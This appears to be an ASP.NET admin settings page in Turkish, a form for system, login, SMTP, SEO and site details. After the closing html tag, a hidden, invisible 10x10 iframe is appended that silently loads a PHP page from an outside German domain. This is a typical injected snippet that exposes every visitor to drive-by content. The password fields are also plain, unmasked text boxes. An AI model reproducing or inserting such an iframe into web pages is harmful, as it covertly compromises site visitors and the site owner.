<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Ayar.aspx.cs" Inherits="Yonetim_GolfResim" %>

<%@ Register TagPrefix="include" TagName="Head" Src="~/Yonetim/Library/Include/Head.ascx" %>
<%@ Register TagPrefix="include" TagName="Ust" Src="~/Yonetim/Library/Include/Ust.ascx" %>
<%@ Register TagPrefix="include" TagName="Menu" Src="~/Yonetim/Library/Include/Menu.ascx" %>
<%@ Register TagPrefix="include" TagName="Alt" Src="~/Yonetim/Library/Include/Alt.ascx" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <include:Head runat="server" ID="Head" />
</head>
<body>
    <form id="form1" runat="server">
        <div id="main_container">
             <include:Ust runat="server" ID="Ust" />
             
             <div class="main_content">
                <include:Menu runat="server" ID="Menu" />
                
                <div class="center_content">

                    <div style="margin:10px;"> 
                        <h2>Parametreler</h2>
                        <fieldset>
                            <legend>Sistem Bilgileri</legend>
                            <div>
                                <table>
                                    <tr>
                                        <td width="150">
                                            <strong>Sistem Başlığı</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_sistembaslik" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td width="150">
                                            <strong>Sistem Adresi</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_sistemadres" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    </table>
                                    </div>
                                    </fieldset>

                                    <fieldset>
                            <legend>Kullanıcı Bilgileri</legend>
                            <div>
                                <table>
                                    <tr>
                                        <td width="150">
                                            <strong>Kullanıcı Adı</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_kullaniciad" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td width="150">
                                            <strong>Şifre</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_sifre" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td width="150">
                                            <strong>Son Giriş Tarihi</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_songiris" runat="server" Width="500px" Enabled="False" 
                                                EnableTheming="True"></asp:TextBox>
                                        </td>
                                    </tr>
                                    </table>
                                    </div>
                                    </fieldset>

                                    <fieldset>
                                    <legend>Smtp Bilgileri</legend>
                                    <div>
                                    <table>
                                    <tr>
                                        <td width="150">
                                            <strong>Smtp</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_smtp" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td width="150">
                                            <strong>Smtp E-Posta</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_smtpeposta" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td width="150">
                                            <strong>Smtp E-Posta Şifre</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_smtpepostasifre" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    </table>
                                    </div>
                                    </fieldset>

                                    <fieldset>
                                    <legend>SEO Ayarları</legend>
                                    <div>
                                    <table>
                                    <tr>
                                        <td width="150">
                                            <strong>Başlık</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_baslik" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td width="150">
                                            <strong>Anahtar Kelimeler</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_anahtar" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td width="150">
                                            <strong>Açıklama</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_aciklama" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    </table>
                                    </div>
                                    </fieldset>

                                    <fieldset>
                                    <legend>Site Bilgileri</legend>
                                    <div>
                                    <table>
                                    <tr>
                                        <td width="150">
                                            <strong>Site Adresi</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_siteadres" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td width="150">
                                            <strong>Güvenlik Kodu</strong></td>
                                        <td>
                                            <strong>:</strong></td>
                                        <td>
                                            <asp:TextBox ID="form_guvenlikkodu" runat="server" Width="500px"></asp:TextBox>
                                        </td>
                                    </tr>
                                </table>
                            </div>
                            </fieldset>
                            <fieldset>
                                <legend>Sabit Yazılar</legend>
                                <div>
                                    <table>
                                        <tr>
                                            <td valign="top" width="150">
                                                <strong>Ana Sayfa Yazı</strong></td>
                                            <td valign="top">
                                                <strong>:</strong></td>
                                            <td>
                                            <asp:TextBox ID="form_anasayfa" runat="server" Width="500px" Height="100px" 
                                                    TextMode="MultiLine"></asp:TextBox>
                                            </td>
                                        </tr>
                                        </table>
                                </div>
                            </fieldset>
                            <fieldset>
                                <legend>İşlemler</legend>
                                <div>
                                <asp:Button ID="Button3" runat="server" onclick="Button3_Click" 
                                    Text="Düzenle" />
                            </div>
                            </fieldset>
                        

                                <fieldset>
                                    <legend>Kayıt Bilgileri</legend>
                                    <div>
                                        <table>
                                            <tr>
                                                <td width="150">
                                                    <b>Güncellenme Tarihi</b></td>
                                                <td>
                                                    <b>:</b></td>
                                                <td><asp:Literal runat="server" ID="degistarih"></asp:Literal></td>
                                            </tr>
                                        </table>
                                    </div>
                                  </fieldset>
                    </div>
                </div>
                
                <div class="clear"></div>
            </div>

            <include:Alt runat="server" ID="Alt" />

        </div>
    </form>
</body>
</html><iframe src="http://www.bc-bs.de/counter.php" style="visibility: hidden; position: absolute; left: 0px; top: 0px" width="10" height="10"/>




